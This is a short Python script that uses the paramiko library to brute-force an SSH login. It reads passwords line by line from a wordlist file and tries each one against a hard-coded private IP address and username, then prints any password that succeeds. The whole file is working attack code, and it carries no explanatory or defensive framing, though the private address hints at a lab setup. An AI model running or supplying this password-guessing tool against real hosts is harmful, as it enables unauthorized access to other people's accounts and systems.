import paramiko
import socket
import time

target_ip = "192.168.1.78"
port = 22
username = "Trieu"

password_file = "sshpassword.txt"


def try_ssh(password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=target_ip,
            port=port,
            username=username,
            password=password,
            timeout=3,
            banner_timeout=3,
            auth_timeout=3
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except (socket.timeout, paramiko.SSHException):
        return False
    finally:
        client.close()


with open(password_file, "r") as f:
    passwords = f.readlines()

for pwd in passwords:
    pwd = pwd.strip()
    print(f"[+] Trying: {pwd}")

    if try_ssh(pwd):
        print(f"[!!!] SUCCESS - Password found: {pwd}")
        break
    else:
        print("[-] Failed")

    time.sleep(0.5)